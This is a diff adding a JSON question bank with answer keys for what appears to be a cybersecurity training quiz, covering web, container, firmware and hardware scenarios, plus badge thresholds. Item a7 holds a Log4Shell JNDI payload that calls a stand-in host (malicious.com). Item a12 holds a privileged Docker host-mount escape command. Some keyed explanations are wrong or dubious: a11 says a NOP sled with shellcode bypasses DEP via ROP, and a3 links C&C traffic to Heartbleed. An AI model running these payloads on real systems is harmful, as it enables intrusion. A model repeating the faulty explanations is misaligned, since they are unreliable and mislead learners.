+              "httpOnly": true,
+              "sameSite": "none"
+            }
+          }
+        },
+        "options": [
+          "Missing httpOnly",
+          "Insecure cookie",
+          "Wrong sameSite",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple issues: cookie not marked secure, sameSite none without secure flag, exposing session to theft and CSRF attacks.",
+        "points": 20
+      },
+      {
+        "id": "i24",
+        "type": "scenario",
+        "question": "Review this password reset flow. What's vulnerable?",
+        "scenario": {
+          "type": "reset_flow",
+          "steps": [
+            "User requests reset",
+            "Token sent to email",
+            "User enters new password",
+            "Password updated if token matches"
+          ],
+          "token_type": "Sequential number"
+        },
+        "options": [
+          "Missing rate limiting",
+          "Predictable tokens",
+          "No expiration time",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple vulnerabilities: sequential tokens are predictable, no rate limiting on requests, and no token expiration time specified.",
+        "points": 20
+      },
+      {
+        "id": "i25",
+        "type": "scenario",
+        "question": "Examine this cache configuration. What's the risk?",
+        "scenario": {
+          "type": "cache_security",
+          "headers": {
+            "Cache-Control": "public, max-age=31536000",
+            "Vary": "None"
+          },
+          "content": "User account page"
+        },
+        "options": [
+          "Information disclosure",
+          "Cache poisoning",
+          "Token exposure",
+          "All of above"
+        ],
+        "correctAnswer": 0,
+        "explanation": "Caching sensitive user account pages can lead to information disclosure. Should use private, no-store for sensitive content.",
+        "points": 20
+      }
+    ],
+    "advanced": [
+      {
+        "id": "a1",
+        "type": "scenario",
+        "question": "Analyze this memory dump. What type of exploit is present?",
+        "scenario": {
+          "type": "memory_analysis",
+          "pattern": "Stack overflow with shellcode signature",
+          "registers": {
+            "EIP": "0x41414141",
+            "ESP": "0x00400000"
+          },
+          "memory": "Contains NOP sled followed by shellcode"
+        },
+        "options": [
+          "Race condition",
+          "Buffer overflow",
+          "Format string vulnerability",
+          "Integer overflow"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The memory dump shows classic buffer overflow indicators: EIP overwritten with 'AAAA' (0x41414141) and presence of NOP sled with shellcode.",
+        "points": 30
+      },
+      {
+        "id": "a2",
+        "type": "scenario",
+        "question": "Review this kernel trace. What vulnerability is being exploited?",
+        "scenario": {
+          "type": "kernel_trace",
+          "syscalls": ["mmap", "ptrace", "write"],
+          "permissions": "Elevation to root",
+          "process": "User application",
+          "timing": "Race condition window"
+        },
+        "options": [
+          "Privilege escalation",
+          "Remote code execution",
+          "Memory corruption",
+          "DoS attack"
+        ],
+        "correctAnswer": 0,
+        "explanation": "The trace shows a privilege escalation attempt exploiting a race condition in system calls to gain root access.",
+        "points": 30
+      },
+      {
+        "id": "a3",
+        "type": "scenario",
+        "question": "Examine this encrypted traffic pattern. What attack is occurring?",
+        "scenario": {
+          "type": "traffic_analysis",
+          "protocol": "HTTPS",
+          "pattern": "Repeated handshakes",
+          "timing": "Regular intervals",
+          "size": "Small packets",
+          "destination": "Known C&C servers"
+        },
+        "options": [
+          "SSL stripping",
+          "Heartbleed",
+          "Beast",
+          "Padding oracle"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The pattern matches Heartbleed exploitation: repeated TLS heartbeat requests to leak memory contents.",
+        "points": 30
+      },
+      {
+        "id": "a4",
+        "type": "scenario",
+        "question": "Analyze this web request. What vulnerability is being exploited?",
+        "scenario": {
+          "type": "web_request",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": "1024",
+            "Transfer-Encoding": "chunked"
+          },
+          "body": "Multiple different content lengths"
+        },
+        "options": [
+          "XSS",
+          "HTTP request smuggling",
+          "CSRF",
+          "Path traversal"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The request shows HTTP request smuggling attempt using conflicting Content-Length and Transfer-Encoding headers.",
+        "points": 30
+      },
+      {
+        "id": "a5",
+        "type": "scenario",
+        "question": "Review this Docker configuration. What security issue exists?",
+        "scenario": {
+          "type": "container_config",
+          "dockerfile": {
+            "USER": "root",
+            "VOLUME": ["/var/run/docker.sock"],
+            "PRIVILEGED": true
+          },
+          "risks": ["container escape", "host system access"]
+        },
+        "options": [
+          "Exposed ports",
+          "Container escape risk",
+          "Weak encryption",
+          "Missing updates"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The configuration allows container escape through root user, mounted docker socket, and privileged mode.",
+        "points": 30
+      },
+      {
+        "id": "a6",
+        "type": "scenario",
+        "question": "Analyze this binary behavior. What malware technique is used?",
+        "scenario": {
+          "type": "binary_analysis",
+          "behavior": {
+            "self_modifying": true,
+            "encrypted_sections": true,
+            "anti_debug": true,
+            "vm_detection": true
+          }
+        },
+        "options": [
+          "Polymorphic code",
+          "Rootkit",
+          "Backdoor",
+          "Keylogger"
+        ],
+        "correctAnswer": 0,
+        "explanation": "The binary shows polymorphic malware characteristics: self-modifying code, encrypted sections, and anti-analysis features.",
+        "points": 30
+      },
+      {
+        "id": "a7",
+        "type": "scenario",
+        "question": "Review this IDS alert. What attack is being attempted?",
+        "scenario": {
+          "type": "ids_alert",
+          "signature": "ET EXPLOIT Possible CVE-2021-44228 Log4j JNDI Injection",
+          "payload": "${jndi:ldap://malicious.com/exploit}",
+          "destination": "Java application server",
+          "protocol": "HTTP"
+        },
+        "options": [
+          "SQL injection",
+          "Log4Shell exploitation",
+          "Command injection",
+          "File inclusion"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The alert shows Log4Shell (CVE-2021-44228) exploitation attempt using JNDI injection in Log4j.",
+        "points": 30
+      },
+      {
+        "id": "a8",
+        "type": "scenario",
+        "question": "Examine this firmware update process. What vulnerability exists?",
+        "scenario": {
+          "type": "firmware_update",
+          "process": {
+            "verification": "none",
+            "encryption": "none",
+            "signing": "missing",
+            "downgrade_protection": "none"
+          }
+        },
+        "options": [
+          "Buffer overflow",
+          "Unsigned firmware",
+          "Memory corruption",
+          "Race condition"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The firmware update process lacks cryptographic signing, allowing potential malicious firmware installation.",
+        "points": 30
+      },
+      {
+        "id": "a9",
+        "type": "scenario",
+        "question": "Analyze this authentication bypass attempt. What technique is used?",
+        "scenario": {
+          "type": "auth_bypass",
+          "method": "JWT",
+          "payload": {
+            "alg": "none",
+            "typ": "JWT"
+          },
+          "signature": "removed"
+        },
+        "options": [
+          "Brute force",
+          "JWT algorithm confusion",
+          "Session hijacking",
+          "Credential stuffing"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The attack uses JWT algorithm confusion by setting 'alg: none' and removing the signature to bypass authentication.",
+        "points": 30
+      },
+      {
+        "id": "a10",
+        "type": "scenario",
+        "question": "Review this smart contract code. What vulnerability exists?",
+        "scenario": {
+          "type": "smart_contract",
+          "code": "function withdraw(uint amount) public {\n  require(balance[msg.sender] >= amount);\n  msg.sender.call.value(amount)();\n  balance[msg.sender] -= amount;\n}",
+          "platform": "Ethereum"
+        },
+        "options": [
+          "Integer overflow",
+          "Reentrancy attack",
+          "Front-running",
+          "Gas limitation"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The smart contract is vulnerable to reentrancy attacks because it updates the balance after sending funds.",
+        "points": 30
+      },
+      {
+        "id": "a11",
+        "type": "scenario",
+        "question": "Analyze this buffer overflow exploit. What protection is being bypassed?",
+        "scenario": {
+          "type": "exploit_analysis",
+          "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90shellcode",
+          "target": "Stack-based buffer",
+          "protection": "DEP enabled"
+        },
+        "options": [
+          "ASLR",
+          "DEP/NX",
+          "Stack Canary",
+          "PIE"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The NOP sled (\\x90) combined with shellcode indicates an attempt to bypass Data Execution Prevention (DEP) through return-oriented programming.",
+        "points": 30
+      },
+      {
+        "id": "a12",
+        "type": "scenario",
+        "question": "Review this Docker container escape attempt. What technique is used?",
+        "scenario": {
+          "type": "container_security",
+          "method": "Mount host filesystem",
+          "command": "docker run --privileged -v /:/host bash",
+          "capability": "CAP_SYS_ADMIN"
+        },
+        "options": [
+          "Volume Mount Escape",
+          "Capability Abuse",
+          "Network Namespace Escape",
+          "Cgroup Escape"
+        ],
+        "correctAnswer": 0,
+        "explanation": "The attack uses privileged mode and volume mounting to escape container isolation by mounting the host's root filesystem.",
+        "points": 30
+      },
+      {
+        "id": "a13",
+        "type": "scenario",
+        "question": "Examine this Kubernetes YAML. What security risk exists?",
+        "scenario": {
+          "type": "k8s_security",
+          "yaml": {
+            "securityContext": {
+              "privileged": true,
+              "capabilities": {"add": ["ALL"]}
+            }
+          }
+        },
+        "options": [
+          "Resource Limits Missing",
+          "Privileged Container",
+          "Network Policy Missing",
+          "Secret Exposure"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The container runs in privileged mode with all capabilities, which could lead to container escape and host system compromise.",
+        "points": 30
+      },
+      {
+        "id": "a14",
+        "type": "scenario",
+        "question": "Analyze this race condition exploit. What vulnerability is being targeted?",
+        "scenario": {
+          "type": "race_condition",
+          "code": "check_permission();\nopen_file();\nmodify_file();",
+          "timing": "Time-of-check to time-of-use",
+          "privilege": "root"
+        },
+        "options": [
+          "TOCTOU",
+          "Double-free",
+          "Use-after-free",
+          "Integer overflow"
+        ],
+        "correctAnswer": 0,
+        "explanation": "This is a Time-of-Check-Time-of-Use (TOCTOU) race condition where the state can change between permission check and file operations.",
+        "points": 30
+      },
+      {
+        "id": "a15",
+        "type": "scenario",
+        "question": "Review this cryptographic implementation. What vulnerability exists?",
+        "scenario": {
+          "type": "crypto_analysis",
+          "algorithm": "AES-CBC",
+          "iv": "static_iv_123456",
+          "padding": "PKCS7"
+        },
+        "options": [
+          "Weak Key Size",
+          "Static IV",
+          "Padding Oracle",
+          "Key Reuse"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Using a static Initialization Vector (IV) in CBC mode compromises semantic security and makes the encryption vulnerable to chosen-plaintext attacks.",
+        "points": 30
+      },
+      {
+        "id": "a16",
+        "type": "scenario",
+        "question": "Analyze this firmware update mechanism. What attack is possible?",
+        "scenario": {
+          "type": "firmware_security",
+          "update_process": {
+            "download": "HTTP",
+            "verification": "checksum",
+            "installation": "automatic"
+          }
+        },
+        "options": [
+          "Downgrade attack",
+          "Evil maid attack",
+          "Supply chain attack",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple vulnerabilities: unencrypted download, weak verification (only checksum), and automatic installation enable various attacks.",
+        "points": 30
+      },
+      {
+        "id": "a17",
+        "type": "scenario",
+        "question": "Review this TPM configuration. What's misconfigured?",
+        "scenario": {
+          "type": "tpm_security",
+          "pcr": {
+            "measurements": false,
+            "sealing": "optional",
+            "validation": "runtime"
+          }
+        },
+        "options": [
+          "Missing PCR measurements",
+          "Weak sealing policy",
+          "Invalid validation",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple issues: PCR measurements disabled, optional sealing policy, and runtime-only validation compromise TPM security.",
+        "points": 30
+      },
+      {
+        "id": "a18",
+        "type": "scenario",
+        "question": "Examine this secure boot configuration. What's vulnerable?",
+        "scenario": {
+          "type": "boot_security",
+          "uefi": {
+            "secure_boot": "optional",
+            "keys": "default",
+            "policy": "audit"
+          }
+        },
+        "options": [
+          "Optional secure boot",
+          "Default key usage",
+          "Weak policy",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple vulnerabilities: optional secure boot, using default keys, and audit-only policy enable boot-level attacks.",
+        "points": 30
+      },
+      {
+        "id": "a19",
+        "type": "scenario",
+        "question": "Analyze this hypervisor escape attempt. What technique is used?",
+        "scenario": {
+          "type": "vm_security",
+          "attack": {
+            "vector": "PCI passthrough",
+            "target": "DMA access",
+            "payload": "Custom driver"
+          }
+        },
+        "options": [
+          "Memory manipulation",
+          "DMA attack",
+          "CPU cache attack",
+          "Time attack"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The attack uses PCI passthrough for DMA access, bypassing hypervisor memory isolation. IOMMU should be properly configured.",
+        "points": 30
+      },
+      {
+        "id": "a20",
+        "type": "scenario",
+        "question": "Review this SGX enclave code. What's the vulnerability?",
+        "scenario": {
+          "type": "enclave_security",
+          "code": "size_t len = untrusted_length;\nmemcpy(trusted_buf, untrusted_data, len);"
+        },
+        "options": [
+          "Buffer overflow",
+          "Time attack",
+          "Page fault attack",
+          "Race condition"
+        ],
+        "correctAnswer": 0,
+        "explanation": "The enclave code trusts untrusted length without validation, enabling buffer overflow attacks against the trusted buffer.",
+        "points": 30
+      },
+      {
+        "id": "a21",
+        "type": "scenario",
+        "question": "Examine this side-channel attack. What's being exploited?",
+        "scenario": {
+          "type": "side_channel",
+          "pattern": "Cache access timing",
+          "target": "AES implementation",
+          "measurement": "High-resolution timer"
+        },
+        "options": [
+          "Cache timing",
+          "Power analysis",
+          "EM emissions",
+          "Acoustic leak"
+        ],
+        "correctAnswer": 0,
+        "explanation": "The attack exploits cache access timing differences in AES implementation to extract key information. Constant-time implementations required.",
+        "points": 30
+      },
+      {
+        "id": "a22",
+        "type": "scenario",
+        "question": "Analyze this hardware debug interface. What's exposed?",
+        "scenario": {
+          "type": "debug_security",
+          "interface": "JTAG",
+          "protection": "None",
+          "access": "External pins"
+        },
+        "options": [
+          "Memory dump",
+          "Code execution",
+          "Key extraction",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Unprotected JTAG interface enables full device access: memory dumping, code execution, and key extraction. Should be disabled or protected.",
+        "points": 30
+      },
+      {
+        "id": "a23",
+        "type": "scenario",
+        "question": "Review this DMA protection. What's misconfigured?",
+        "scenario": {
+          "type": "dma_security",
+          "iommu": "Disabled",
+          "bounce_buffers": "Optional",
+          "memory_regions": "All accessible"
+        },
+        "options": [
+          "IOMMU disabled",
+          "Weak buffer policy",
+          "Unrestricted access",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple issues: IOMMU disabled, optional bounce buffers, and unrestricted memory access enable DMA-based attacks.",
+        "points": 30
+      },
+      {
+        "id": "a24",
+        "type": "scenario",
+        "question": "Examine this secure element integration. What's vulnerable?",
+        "scenario": {
+          "type": "secure_element",
+          "key_storage": "Software backup",
+          "communication": "Plaintext",
+          "authentication": "Static PIN"
+        },
+        "options": [
+          "Key backup",
+          "Unencrypted channel",
+          "Weak auth",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple vulnerabilities: software key backup, plaintext communication, and static PIN authentication compromise secure element protection.",
+        "points": 30
+      },
+      {
+        "id": "a25",
+        "type": "scenario",
+        "question": "Analyze this fault injection protection. What's missing?",
+        "scenario": {
+          "type": "fault_security",
+          "voltage": "Unmonitored",
+          "clock": "External",
+          "temperature": "No sensors"
+        },
+        "options": [
+          "Voltage monitoring",
+          "Clock protection",
+          "Temperature sensing",
+          "All of above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Missing all key fault injection protections: voltage monitoring, secure clock source, and temperature sensors. Device vulnerable to glitching.",
+        "points": 30
+      }
+    ]
+  },
+  "badges": {
+    "beginner": {
+      "bronze": {
+        "name": "Cyber Novice",
+        "requirement": 60,
+        "icon": "🥉"
+      },
+      "silver": {
+        "name": "Security Scout",
+        "requirement": 80,
+        "icon": "🥈"
+      },
+      "gold": {
+        "name": "Digital Defender",
+        "requirement": 90,
+        "icon": "🥇"
+      }
+    },
+    "intermediate": {
+      "bronze": {
+        "name": "Security Specialist",
+        "requirement": 120,
+        "icon": "🥉"
+      },
+      "silver": {
+        "name": "Cyber Guardian",
+        "requirement": 160,
+        "icon": "🥈"
+      },
+      "gold": {
+        "name": "Security Sentinel",
+        "requirement": 180,
+        "icon": "🥇"
+      }
+    },
+    "advanced": {
+      "bronze": {
+        "name": "Security Expert",
+        "requirement": 180,
+        "icon": "🥉"
+      },
+      "silver": {
+        "name": "Cyber Master",
+        "requirement": 240,
+        "icon": "🥈"
+      },
+      "gold": {
+        "name": "Security Wizard",
+        "requirement": 270,
+        "icon": "🥇"
+      }
+    }
+  }
+} 
